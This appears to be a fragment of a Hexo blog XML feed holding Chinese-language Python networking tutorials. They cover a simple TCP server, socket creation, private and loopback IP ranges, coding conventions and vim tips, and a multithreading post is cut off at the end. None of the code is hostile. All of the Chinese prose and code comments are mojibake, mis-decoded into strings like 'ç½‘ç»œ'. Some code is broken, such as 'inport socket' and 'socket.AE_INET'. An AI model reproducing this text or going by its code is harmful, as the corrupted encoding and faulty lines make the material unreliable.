class="string">&#x27;&#x27;</span>,<span class="number">45586</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3. è®©é»˜è®¤çš„å¥—æ¥å­—ç”±ä¸»åŠ¨å˜è¢«åŠ¨</span></span><br><span class="line">    tcp_server_socket.listen(<span class="number">128</span>)  <span class="comment"># ä¸ºä»€ä¹ˆæ˜¯ 128</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;ç­‰å¾…ä¸€ä¸ªæ–°çš„å®¢æˆ·ç«¯åˆ°æ¥...&#x27;</span>)</span><br><span class="line">        <span class="comment"># 4. ç­‰å¾…å®¢æˆ·ç«¯é“¾æ¥ accept</span></span><br><span class="line">        client_socket, client_addr = tcp_server_socket.accept()</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;ä¸€ä¸ªæ–°çš„å®¢æˆ·ç«¯åˆ°æ¥ï¼š%s&quot;</span> % <span class="built_in">str</span>(client_addr))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="comment"># æ¥æ”¶å®¢æˆ·ç«¯å‘æ¥çš„è¯·æ±‚</span></span><br><span class="line">            recv_data = client_socket.recv(<span class="number">1024</span>)</span><br><span class="line">            <span class="keyword">if</span> recv_data:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;å®¢æˆ·ç«¯å‘è¿‡æ¥çš„è¯·æ±‚æ—¶ï¼š%s&quot;</span> % recv_data.decode(<span class="string">&#x27;gbk&#x27;</span>))</span><br><span class="line"></span><br><span class="line">                <span class="comment"># å‘é€ä¿¡æ¯</span></span><br><span class="line">                client_socket.send((<span class="string">&#x27;GoodBye MyLove!&#x27;</span>).encode(<span class="string">&#x27;gbk&#x27;</span>))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># å…³é—­å®¢æˆ·ç«¯å¥—æ¥å­— å…³é—­ accept è¿”å›çš„å¥—æ¥å­—æ„å‘³ç€ä¸ä¼šå†ä¸ºè¿™ä¸ªå®¢æˆ·ç«¯è¿›è¡ŒæœåŠ¡ã€‚</span></span><br><span class="line">        client_socket.close()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;å·²ç»æœåŠ¡å®Œæ¯•ï¼&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># tcp å…³é—­å¥—æ¥å­—, å…³é—­ç›‘å¬å¥—æ¥å­—ï¼Œä¼šå¯¼è‡´ä¸å†ç­‰å¾…æ–°çš„å®¢æˆ·ç«¯åˆ°æ¥ï¼Œå³ï¼šxxx.aceept() å¤±è´¥</span></span><br><span class="line">    tcp_server_socket.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>TCP çš„æœåŠ¡ç«¯å¿…é¡»ç»‘å®šç«¯å£ã€‚TCPå®¢æˆ·ç«¯æ²¡æœ‰å¿…è¦ç»‘å®šï¼Œä¸€æ–¹é¢æ˜¯é¿å…å›ºå®šç«¯å£ä¸åˆ«çš„å†²çªï¼Œå¦ä¸€æ–¹é¢ä¾¿äºå¤šå¼€ã€‚</p><p>listen ä½¿å¥—æ¥å­—å˜ä¸ºå¯ä»¥è¢«åŠ¨ç›‘å¬ï¼Œacceptä¼šè¿›å…¥é˜»å¡çŠ¶æ€ï¼Œç­‰å¾…å®¢æˆ·ç«¯çš„é“¾æ¥ã€‚</p><p>listen() ä¸­çš„ 128è¿™ä¸ªå€¼ä¸è¿æ¥æœåŠ¡å™¨çš„å®¢æˆ·ç«¯çš„ä¸ªæ•°æœ‰ä¸€ç‚¹å„¿å…³ç³»ï¼Œä½†æ˜¯å¹¶ä¸æ˜¯ç»å¯¹çš„ï¼Œå†™ 128256 7 10 æ²¡å¤ªå¤§åŒºåˆ«ï¼Œå…·ä½“ä¸æ“ä½œç³»ç»Ÿæœ‰å…³ã€‚</p><p>accept() è¿”å›ä¸€ä¸ªå…ƒç»„ï¼Œæˆ‘ä»¬ç›´æ¥æ‹†åŒ…ä½¿ç”¨å°±è¡Œäº†ã€‚</p><p>recv() è¿”å›å€¼åªæœ‰æ•°æ®ï¼Œ recvfrom() è¿”å›å€¼è¿˜æœ‰ ip port</p><p>å¦‚æœè¦ä¸€è‡´å¤„ç†è¯·æ±‚çš„è¯ï¼Œåœ¨ accept ä¹‹å‰ ä½¿ç”¨ while Trueï¼Œå› ä¸º accpetè¦è¿›å…¥é˜»å¡çŠ¶æ€ï¼Œç­‰å¾…å®¢æˆ·ç«¯è¿æ¥ã€‚</p><p>TCPçš„æœåŠ¡ç«¯å¯ä»¥åŒæ—¶æœ‰å¤šä¸ªå®¢æˆ·ç«¯è¿æ¥ï¼Œä½†æ˜¯å…ˆæ¥çš„å®¢æˆ·ç«¯å…ˆå¾—åˆ°æœåŠ¡ï¼Œåé¢çš„è™½ç„¶è¿æ¥ä¸Šäº†ï¼Œå´å¾—ä¸åˆ°æœåŠ¡ã€‚tcpæœåŠ¡ç«¯ä¸€æ¬¡åªèƒ½æœåŠ¡ä¸€ä¸ªäººã€‚</p><p>recv ä¼šå µå¡ï¼Œç­‰å¾…å®¢æˆ·ç«¯å‘é€è¿‡æ¥æ•°æ®ã€‚</p><p>recv è§£å µå¡æœ‰ä¸¤ç§æƒ…å†µ:</p><ol type="1"><li>æ¥æ”¶åˆ°äº†å®¢æˆ·ç«¯çš„æ¶ˆæ¯</li><li>å®¢æˆ·ç«¯å…³é—­äº†å¥—æ¥å­—ã€‚</li></ol><p>å®¢æˆ·ç«¯å…³é—­å¥—æ¥å­—ï¼Œrecvçš„è¿”å›å€¼ä¸ºç©ºã€‚ï¼ˆæ³¨ï¼šå¦‚æœæ˜¯å®¢æˆ·ç«¯å‘é€æ¶ˆæ¯ï¼Œå‘é€ä¸äº†ç©ºçš„æ¶ˆæ¯ã€‚ï¼‰</p><p>æˆ‘ä»¬é€šè¿‡åˆ¤æ–­ recv çš„è¿”å›å€¼æ¥åˆ¤æ–­å®¢æˆ·ç«¯æ˜¯å¦ close</p><p>if åé¢å¯ä»¥æ”¾æ•°å­—ï¼Œå­—ç¬¦ä¸²ï¼Œå…ƒç»„ï¼Œé›†åˆï¼Œå­—å…¸ï¼Œåˆ—è¡¨å’ŒNoneï¼ŒTrueï¼ŒFalse</p><p>æ•°å­—ï¼šä¸æ˜¯ 0 æˆç«‹ï¼›</p><p>å­—ç¬¦ä¸²ï¼Œå…ƒç»„ï¼Œé›†åˆï¼Œå­—å…¸ï¼Œåˆ—è¡¨ï¼šéç©ºæˆç«‹</p><p>ä¸æ˜¯ Noneï¼Œä¸æ˜¯ False æˆç«‹</p><p>True æˆç«‹</p><p>æ€»ç»“ï¼š</p><table><thead><tr class="header"><th>UDP</th><th>TCP Client</th><th>TCP Server</th></tr></thead><tbody><tr class="odd"><td>socket</td><td>socket</td><td>socket</td></tr><tr class="even"><td>bindï¼ˆå¦‚æœè¦æ¥æ”¶æ¶ˆæ¯çš„è¯ï¼‰</td><td>connect</td><td>bind</td></tr><tr class="odd"><td>sendto/recvfrom</td><td>send</td><td>listen</td></tr><tr class="even"><td>close</td><td>close</td><td>accept</td></tr><tr class="odd"><td></td><td></td><td>recv/send</td></tr><tr class="even"><td></td><td></td><td>close</td></tr></tbody></table><h1 id="qq-çš„æ•´ä½“æ¶æ„äº†è§£">QQ çš„æ•´ä½“æ¶æ„ï¼ˆäº†è§£ï¼‰</h1><p>qq1 ç™»å½• tcp è¿æ¥è…¾è®¯æœåŠ¡å™¨ï¼ˆæœ‰å›ºå®šç«¯å£ï¼‰</p><p>qq2 ç™»å½• tcp è¿æ¥è…¾è®¯æœåŠ¡å™¨ï¼ˆæœ‰å›ºå®šç«¯å£ï¼‰</p><p>qq1 å‘ qq2 å‘æ¶ˆæ¯ï¼šæ¶ˆæ¯ä» qq1 åˆ°è¾¾è…¾è®¯æœåŠ¡å™¨ï¼Œè…¾è®¯æœåŠ¡æ ¹æ®ä½ çš„å¥½å‹qq2 çš„ä¿¡æ¯ï¼Œæ‰¾åˆ°å…¶ ip å’Œç«¯å£çš„å¥—æ¥å­—ï¼Œç„¶åå‘é€åˆ° qq2ã€‚</p><p>æ‰€ä»¥è…¾è®¯æœåŠ¡å™¨å……å½“ä¸€ä¸ªè½¬å‘å’Œç›‘è§†åŠŸèƒ½(emmmï¼Œ ä½ æ‡‚å¾—ï¼Œå°å¿ƒè¯´è¯)ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python ç½‘ç»œç¼–ç¨‹ç®€ä»‹</title>
      <link href="/blog/2019/08/31/programming/python/3.network_programming/01.py_socket_begin/"/>
      <url>/blog/2019/08/31/programming/python/3.network_programming/01.py_socket_begin/</url>
      
        <content type="html"><![CDATA[<h1 id="ç½‘ç»œç¼–ç¨‹æ¦‚è¿°">ç½‘ç»œç¼–ç¨‹æ¦‚è¿°</h1><ol type="1"><li><p>ä½¿ç”¨ç½‘ç»œç¼–ç¨‹èƒ½å¤ŸæŠŠå¤šæ–¹é“¾æ¥åœ¨ä¸€èµ·ï¼Œç„¶åå¯ä»¥è¿›è¡Œæ•°æ®ä¼ é€’ã€‚</p></li><li><p>æ‰€è°“çš„ç½‘ç»œç¼–ç¨‹å°±æ˜¯ï¼Œè®©ä¸åŒçš„ç”µè„‘ä¸Šçš„è½¯ä»¶èƒ½å¤Ÿè¿›è¡Œæ•°æ®ä¼ é€’ï¼Œå³ï¼šè¿›ç¨‹ä¹‹é—´çš„é€šä¿¡ã€‚</p></li><li><p>ipåœ°å€ï¼Œåè®®ï¼Œç«¯å£å°±å¯ä»¥æ ‡è¯†ç½‘ç»œçš„è¿›ç¨‹ï¼Œç½‘ç»œä¸­çš„è¿›ç¨‹é€šä¿¡åˆ©ç”¨è¿™ä¸ªæ ‡å¿—ä¸å…¶å®ƒè¿›ç¨‹è¿›è¡Œäº¤äº’</p><ol type="1"><li>æ‰€è°“<code>è¿›ç¨‹</code>æŒ‡çš„æ˜¯ï¼šè¿è¡Œçš„ç¨‹åºä»¥åŠè¿è¡Œæ—¶ç”¨åˆ°çš„èµ„æºè¿™ä¸ªæ•´ä½“ç§°ä¹‹ä¸ºè¿›ç¨‹ï¼ˆåœ¨è®²è§£å¤šä»»åŠ¡ç¼–ç¨‹æ—¶è¿›è¡Œè¯¦ç»†è®²è§£ï¼‰</li><li>æ‰€è°“<code>è¿›ç¨‹é—´é€šä¿¡</code>æŒ‡çš„æ˜¯ï¼šè¿è¡Œçš„ç¨‹åºä¹‹é—´çš„æ•°æ®å…±äº«</li></ol></li></ol><p>Socket</p><p>socket(ç®€ç§° <code>å¥—æ¥å­—</code>)æ˜¯è¿›ç¨‹é—´é€šä¿¡çš„ä¸€ç§æ–¹å¼ï¼Œå®ƒä¸å…¶ä»–è¿›ç¨‹é—´é€šä¿¡çš„ä¸€ä¸ªä¸»è¦ä¸åŒæ˜¯ï¼š</p><p>å®ƒèƒ½å®ç°ä¸åŒä¸»æœºé—´çš„è¿›ç¨‹é—´é€šä¿¡ï¼Œæˆ‘ä»¬ç½‘ç»œä¸Šå„ç§å„æ ·çš„æœåŠ¡å¤§å¤šéƒ½æ˜¯åŸºäºSocket æ¥å®Œæˆé€šä¿¡çš„</p><h1 id="é¢„å¤‡çŸ¥è¯†">é¢„å¤‡çŸ¥è¯†</h1><h4 id="å±€åŸŸç½‘-ip">å±€åŸŸç½‘ ip</h4><p>åœ¨è¿™ä¹ˆå¤šç½‘ç»œ IP ä¸­ï¼Œå›½é™…è§„å®šæœ‰ä¸€éƒ¨åˆ† IPåœ°å€æ˜¯ç”¨äºæˆ‘ä»¬çš„å±€åŸŸç½‘ä½¿ç”¨ï¼Œä¹Ÿå°±</p><p>æ˜¯å±äºç§ç½‘ IPï¼Œä¸åœ¨å…¬ç½‘ä¸­ä½¿ç”¨çš„ï¼Œå®ƒä»¬çš„èŒƒå›´æ˜¯ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">10.0.0.0ï½10.255.255.255</span><br><span class="line"></span><br><span class="line">172.16.0.0ï½172.31.255.255</span><br><span class="line"></span><br><span class="line">192.168.0.0ï½192.168.255.255</span><br></pre></td></tr></table></figure><p>169 å¼€å¤´</p><p>169.254.X.X æ˜¯ <strong>Windows æ“ä½œç³»ç»Ÿ</strong> åœ¨ DHCPä¿¡æ¯ç§Ÿç”¨å¤±è´¥æ—¶è‡ªåŠ¨ç»™å®¢æˆ·æœºåˆ†é…çš„ IP åœ°å€..</p><p>ç”±äºç½‘ç»œè¿æ¥é—®é¢˜(ç½‘çº¿é—®é¢˜,DHCP æœåŠ¡å™¨(å…¶å®å°±æ˜¯Modem,è·¯ç”±å™¨,æˆ–æä¾›å…±äº«ä¸Šç½‘çš„ä¸»æœº)é—®é¢˜ç­‰),</p><p>è€Œä»¤ DHCP ä¿¡æ¯ç§Ÿç”¨å¤±è´¥,è€Œ IP169.254.X.Xçš„åˆ†é…å¯èƒ½ä¼šä»¤å®¢æˆ·æœº(ä½ è‡ªå·±çš„è®¡ç®—æœº,è®¾ç½®äº†"è‡ªåŠ¨è·å–IP")ä¸æ‰€å¤„å±€åŸŸç½‘ç½‘å…³(Modem,è·¯ç”±å™¨,æˆ–æä¾›å…±äº«ä¸Šç½‘çš„ä¸»æœº)ä½äºä¸åŒçš„ç½‘æ®µä¸­,è€Œæ— æ³•ä¸ç½‘å…³é€šä¿¡,è€Œå¯¼è‡´æ— æ³•æ¥å…¥ Internet çš„æƒ…å†µ...</p><p>ç¯å›åœ°å€ 127.0.0.1</p><p>ä¸¥æ ¼æ¥è¯´ 127.0.0.1 åªæ˜¯<strong>ç¯å›åœ°å€</strong>ä¹‹ä¸€ã€‚æ‰€æœ‰ 127.x.x.xéƒ½æ˜¯ç¯å›åœ°å€ã€‚ä» 127.0.0.0 åˆ° 127.255.255.255å‡äºˆä»¥ä¿ç•™ã€‚æ­¤åœ°å€å—ä¸­çš„ä»»ä½•åœ°å€éƒ½å°†ç¯å›åˆ°æœ¬åœ°ä¸»æœºä¸­ã€‚æ­¤åœ°å€å—ä¸­çš„ä»»ä½•åœ°å€éƒ½ç»ä¸ä¼šå‡ºç°åœ¨ä»»ä½•ç½‘ç»œä¸­ã€‚</p><p>ç¯å›åœ°å€ï¼šæ‰€æœ‰å‘å¾€è¯¥ç±»åœ°å€çš„æ•°æ®åŒ…éƒ½åº”è¯¥è¢« loop backã€‚æ­£å¸¸çš„ç½‘ç»œåŒ…ä»IP å±‚è¿›å…¥æ•°æ®é“¾è·¯å±‚ï¼Œç„¶åå‘é€åˆ°ç½‘ç»œä¸Šï¼Œè€Œå‘å‘<code>loopback</code>åœ°å€çš„åŒ…ï¼Œç›´æ¥åœ¨ IP å±‚çŸ­è·¯äº†ï¼Œä¹Ÿå°±æ˜¯å‘åˆ° IPå±‚çš„åŒ…ç›´æ¥è¢« IP å±‚æ¥æ”¶äº†ï¼Œä¸å†å‘ä¸‹å‘é€ã€‚</p><p>ç¯å›åœ°å€ä¸»è¦ç”¨æ¥åšå›ç¯æµ‹è¯•ï¼Œé€šè¿‡ä½¿ç”¨ ping 127.0.0.1æµ‹è¯•æŸå°æœºå™¨ä¸Šçš„ç½‘ç»œè®¾å¤‡ï¼Œæ“ä½œç³»ç»Ÿæˆ–è€… TCP/IP å®ç°æ˜¯å¦å·¥ä½œæ­£å¸¸ã€‚</p><p>ä»»ä½•åœ°å€ 0.0.0.0</p><p>0.0.0.0 ä¸èƒ½ ping é€šã€‚0.0.0.0å°±æ˜¯ä»»ä½•åœ°å€<code>IP_ADDR_ANY</code>ï¼Œä»»ä½•åœ°å€çš„æ„æ€å°±æ˜¯åŒ…æ‹¬ç¯å›åœ°å€ã€‚</p><p>ä»»ä½•åœ°å€<code>IP_ADDR_ANY</code>çš„æ„æ€ä¹Ÿå°±æ˜¯ï¼Œä¸ç®¡ä¸»æœºæœ‰å¤šå°‘ä¸ªç½‘å£ï¼Œå¤šå°‘ä¸ªIPï¼Œå¦‚æœç›‘å¬æœ¬æœºçš„ 0.0.0.0 ä¸Šçš„ç«¯å£ï¼Œå°±ç­‰äºç›‘å¬æœºå™¨ä¸Šçš„æ‰€æœ‰ IPç«¯å£ã€‚æ•°æ®æŠ¥çš„ç›®çš„åœ°å€åªè¦æ˜¯æœºå™¨ä¸Šçš„ä¸€ä¸ª IP åœ°å€ï¼Œå°±èƒ½è¢«æ¥å—ã€‚</p><p>ä»¥ä¸Šä¸¤æ®µå‡ºè‡ªä¸‹é¢çš„<code>æœ¬æœºIPåœ°å€ã€ 127.0.0.1 å’Œ 0.0.0.0 çš„åŒºåˆ«</code>å‚è€ƒæ–‡ç« ï¼Œå†™çš„æŒºå¥½çš„ï¼Œæ„Ÿè§‰æ²¡ä»€ä¹ˆè¦æ”¹çš„ã€‚</p><p>0 ç«¯å£ï¼š</p><p>ç«¯å£å· 0 æ˜¯ä¸€ä¸ªé¢„ç•™çš„ç«¯å£å·ï¼Œä»£è¡¨çš„æ„æ€å°±æ˜¯å®ƒåœ¨ TCP æˆ–è€… UDPç½‘ç»œä¼ è¾“ä¸­åº”è¯¥ä¸ä¼šè¢«ç”¨åˆ°ã€‚ä½†æ˜¯åœ¨ç½‘ç»œç¼–ç¨‹ä¸­ï¼Œå°¤å…¶æ˜¯åœ¨ unix socketç¼–ç¨‹å½“ä¸­ï¼Œå®ƒæœ‰ä¸€äº›ç‰¹æ®Šçš„å«ä¹‰ã€‚åœ¨ unix socket ç¼–ç¨‹å½“ä¸­ï¼Œç«¯å£å· 0æ˜¯ä¸€ç§ç”±ç³»ç»ŸæŒ‡å®šåŠ¨æ€ç”Ÿæˆçš„ç«¯å£ã€‚</p><h1 id="å¥—æ¥å­—çš„ä½¿ç”¨">å¥—æ¥å­—çš„ä½¿ç”¨</h1><p>å¥—æ¥å­—çš„ä½¿ç”¨æµç¨‹å’Œæ–‡ä»¶çš„ä½¿ç”¨æµç¨‹å¾ˆç±»ä¼¼</p><ol type="1"><li><p>åˆ›å»ºå¥—æ¥å­—</p><p>åœ¨ Python ä¸­ä½¿ç”¨ socket æ¨¡å—çš„å‡½æ•° socket ä¾¿å¯ä»¥å®Œæˆ</p><p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">inport socket</span><br><span class="line">socket.socket(AddressFamily, Type)</span><br></pre></td></tr></table></figure></p><ul><li>Address Familyï¼šåè®®æ—ï¼Œä»£è¡¨ä½ é€‰æ‹© IPv4 è¿˜æ˜¯ IPv6ï¼ˆIPv4 å¯¹åº”å‚æ•°AF_INETï¼Œ IPv6 å¯¹åº”å‚æ•° AF_INET6ï¼‰ã€‚å¯ä»¥é€‰æ‹© AF_INETï¼ˆç”¨äº Internetè¿›ç¨‹é—´é€šä¿¡ï¼‰ æˆ–è€… AF_UNIXï¼ˆç”¨äºåŒä¸€å°æœºå™¨è¿›ç¨‹é—´é€šä¿¡ï¼‰,å®é™…å·¥ä½œä¸­å¸¸ç”¨AF_INET</li><li>Typeï¼šå¥—æ¥å­—ç±»å‹ï¼ˆä¼ è¾“åè®®ç±»å‹ï¼ŒTCP æˆ– UDPï¼‰ï¼Œå¯ä»¥æ˜¯SOCK_STREAMï¼ˆæµå¼å¥—æ¥å­—ï¼Œä¸»è¦ç”¨äº TCP åè®®ï¼‰æˆ–è€…SOCK_DGRAMï¼ˆæ•°æ®æŠ¥å¥—æ¥å­—ï¼Œä¸»è¦ç”¨äº UDP åè®®ï¼‰</li></ul></li><li><p>ä½¿ç”¨å¥—æ¥å­—æ”¶/å‘æ•°æ®</p></li><li><p>å…³é—­å¥—æ¥å­—</p></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="comment">#åˆ›å»º tcp çš„å¥—æ¥å­—</span></span><br><span class="line">s = socket.socket(socket.AE_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="comment">#æˆ–åˆ›å»º udp å¥—æ¥å­—</span></span><br><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)</span><br><span class="line"></span><br><span class="line"><span class="comment">#...è¿™é‡Œæ˜¯ä½¿ç”¨å¥—æ¥å­—çš„åŠŸèƒ½ï¼ˆçœç•¥ï¼‰ã€‚ã€‚ã€‚</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#ä¸ç”¨çš„æ—¶å€™ï¼Œå…³é—­å¥—æ¥å­—ã€‚</span></span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure><p>å¦‚æœæŠ¥é”™</p><blockquote><p>SyntaxError:Non-ASCII character '' in file</p></blockquote><p>é‚£ä½ æ˜¯ç”¨ Python 2 è¿è¡Œçš„ï¼Œè€Œä¸”æ²¡æœ‰åŠ ç¼–ç ã€‚ä½ éœ€è¦ä½¿ç”¨ Python 3è¿è¡Œã€‚</p><p>æ³¨æ„ï¼šä½ çš„ python ä»£ç ä¸‹ä¸è¦æ–°å»ºä¸ä½ å¯¼å…¥çš„åº“åå­—ä¸€æ ·çš„ pyæ–‡ä»¶ï¼Œå¦åˆ™ä¼šä¼˜å…ˆå¯¼å…¥å®ƒã€‚</p><h1 id="ç¼–ç¨‹è§„èŒƒ">ç¼–ç¨‹è§„èŒƒ</h1><p>ä»£ç ä¸æ˜¯ä»ç¬¬ä¸€è¡Œå¼€å§‹å†™çš„,è€Œæ˜¯é¦–å…ˆå†™å…¥å£å‡½æ•°ï¼Œç„¶åä½¿ç”¨åˆ°ä»€ä¹ˆï¼Œå†å»å¼•å…¥ä»€ä¹ˆæ¨¡å—æˆ–åº“ã€‚</p><p>ç¼–ç¨‹æ—¶å…ˆå†™</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>  __name__==<span class="string">&#x27;__main__&#x27;</span></span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p>ç„¶åå†å»ä¸Šé¢å†™å‡½æ•°</p><p>å¼€å‘ä¸­å†™å‡½æ•°åå¦‚æœé‡åˆ° to ä¸€èˆ¬å†™ä¸º 2</p><p>æ³¨é‡Šè§„èŒƒ:</p><ol type="1"><li>å¦‚æœæ³¨é‡Šåœ¨ä¸€è¡Œçš„è¡Œå¤´,ç›´æ¥å†™ #,ç„¶åç©ºä¸€ä¸ªç©ºæ ¼,å†å†™</li><li>å¦‚æœåœ¨ä¸€è¡Œçš„ä»£ç åé¢, é‚£ä¹ˆé¦–å…ˆè¦ç©ºä¸¤æ ¼ç©ºæ ¼,ç„¶åå†™ #,å†ç©ºä¸€æ ¼ç©ºæ ¼å†™æ³¨é‡Š.</li></ol><p>å‡½æ•°ä¸å‡½æ•°ä¹‹é—´è¦ç©ºä¸¤è¡Œ,ç¬¬ä¸€ä¸ªå‡½æ•°ä¸å‰é¢ä¹Ÿè¦ç©ºä¸¤è¡Œ.</p><p>å†™å‡½æ•°æ—¶ï¼Œè¦æƒ³æƒ³å…¶éœ€ä¸éœ€è¦å‚æ•°ã€‚</p><p>Windows é»˜è®¤ç¼–ç  GBK , æ‰€ä»¥æˆ‘ä»¬å¯¹ä» Windows æ”¶åˆ°çš„æ•°æ®è¦ä½¿ç”¨ GBKè§£ç .</p><p>Mac æˆ– Linux ä½¿ç”¨ utf-8 å³å¯</p><p>å‘é€æ•°æ®ä¸éœ€è¦ç»‘å®šç«¯å£,ç³»ç»Ÿä¼šéšæœºåˆ†é…ä¸€ä¸ªç«¯å£,ä½†æ˜¯æ¥æ”¶æ–¹éœ€è¦ç»‘å®šç«¯å£,æ‰èƒ½æ­£ç¡®åœ°æ”¶åˆ°æ•°æ®.</p><p>æ‰€ä»¥å¦‚æœä½ æƒ³å³å‘æ¶ˆæ¯åˆæ”¶æ¶ˆæ¯,é‚£ä½ éœ€è¦ç»‘å®šç«¯å£.</p><p>ä¸€ä¸ªå¥—æ¥å­—å¯ä»¥åŒæ—¶æ”¶å‘æ•°æ®ï¼Œ å³ï¼šsocket å¥—æ¥å­—æ˜¯å…¨åŒå·¥.</p><p>å•å·¥: æ”¶éŸ³æœºç­‰, åªèƒ½è¿›è¡Œä¸€ä¸ªæ–¹å‘çš„åŠ¨ä½œ</p><p>åŠåŒå·¥: å¯ä»¥åŒå‘èµ°,ä½†åŒä¸€æ—¶åˆ»åªèƒ½æœ‰ä¸€ä¸ªæ–¹å‘</p><p>å…¨åŒå·¥: åŒä¸€æ—¶åˆ»æ—¢å¯ä»¥æ”¶åˆå¯ä»¥å‘.</p><h1 id="ubuntu-python-ç¼–ç¨‹æ‚è®°">Ubuntu python ç¼–ç¨‹æ‚è®°</h1><p>Ubuntu ä¸Šæœ‰ ipython 3 æ˜¯ python äº¤äº’æ¨¡å¼çš„å¢å¼ºç‰ˆï¼Œæ”¯æŒ Linuxå‘½ä»¤(æ¸…å±,è¡¥å…¨ç­‰)</p><p>vim å¿«æ·é”® æŒ‰ä¸‹ V,ä¸Šä¸‹é€‰ä¸­,shift &lt; æˆ– shfit &gt;</p><p>è·³åˆ°æŒ‡å®šè¡Œ: åˆ‡æ¢åˆ°å‘½ä»¤æ¨¡å¼,ç„¶å è¾“å…¥è¡Œå·,å†è¾“å…¥å¤§å†™çš„ G(å³: shift +g)</p><p>ä»å‘½ä»¤æ¨¡å¼åˆ°ç¼–è¾‘æ¨¡å¼:</p><p>å¤§å†™çš„ i æ˜¯è°ƒåˆ°è¡Œé¦–, å¤§å†™çš„ a æ˜¯è·³åˆ°è¡Œå°¾.</p><p>Ctrl + shift + t : å†å¼€ä¸€ä¸ªç»ˆç«¯æ ‡ç­¾é¡µ</p><p>å¤åˆ¶å‰ªåˆ‡ç²˜è´´çš„å¿«æ·é”®</p><p>å¦‚æœè¦åœ¨æ‰“å¼€ vim å°†é¼ æ ‡å®šä½åˆ°é”™è¯¯è¡Œ,é‚£åœ¨æ‰“å¼€å‘½ä»¤å: [ç©ºæ ¼]+è¡Œå·</p><p>å¦‚æœä½¿ç”¨ vim ç›´æ¥ vimå›è½¦ï¼Œæ²¡æœ‰å†™æ–‡ä»¶åï¼Œé‚£ä¿å­˜çš„æ—¶å€™ä½¿ç”¨ä¸€ä¸‹å‘½ä»¤ç„¶åå›è½¦ã€‚</p><p>:w åå­—</p><p>å¦‚æœä½ æƒ³è¦åœ¨æ–‡ä»¶åä¸­ä½¿ç”¨æ‹¬å·ï¼Œé‚£ä¹ˆéœ€è¦ä½¿ç”¨åæ–œæ è½¬ä¹‰ã€‚</p><p>å‚è€ƒèµ„æ–™ï¼š</p><blockquote><p><a href="https://www.jianshu.com/p/ba8abad56ba9">æœ¬æœº IP åœ°å€ã€127.0.0.1 å’Œ 0.0.0.0 çš„åŒºåˆ«</a></p><p><a href="https://github.com/lhchen74/python-note">python-note</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pythonå¤šçº¿ç¨‹åŸºç¡€</title>
      <link href="/blog/2019/08/30/programming/python/py_multithreading/"/>
      <url>/blog/2019/08/30/programming/python/py_multithreading/</url>
      
        <content type="html"><![CDATA[<h1 id="åŸç†">åŸç†</h1><p>å¹¶è¡Œä¸å¹¶å‘ï¼š</p><p>å¹¶è¡Œæ˜¯çœŸæ­£çš„å¤šä»»åŠ¡ä¸€èµ·æ‰§è¡Œï¼Œä¸€ä¸ªä»»åŠ¡å ç”¨ä¸€ä¸ª CPU æ ¸ã€CPUçš„æ ¸å¿ƒæ•°å¤§äºç­‰äºä»»åŠ¡æ•°ã€‚</p><p>å¹¶å‘ï¼›æ˜¯å‡çš„å¤šä»»åŠ¡ï¼Œé‡‡ç”¨æ—¶é—´ç‰‡è½®è½¬ï¼ˆä¸€ä¸ªæ—¶é—´ç‰‡é‡Œé¢æ¯ä¸ªè¿›ç¨‹è½®æµè¿è¡Œä¸€æ®µæ—¶é—´ã€‚ï¼‰å’Œä¼˜å…ˆçº§è°ƒåº¦ï¼ˆéŸ³è§†é¢‘ç­‰ä¼˜å…ˆçº§è¾ƒé«˜ï¼‰</p><p>CPU çš„æ 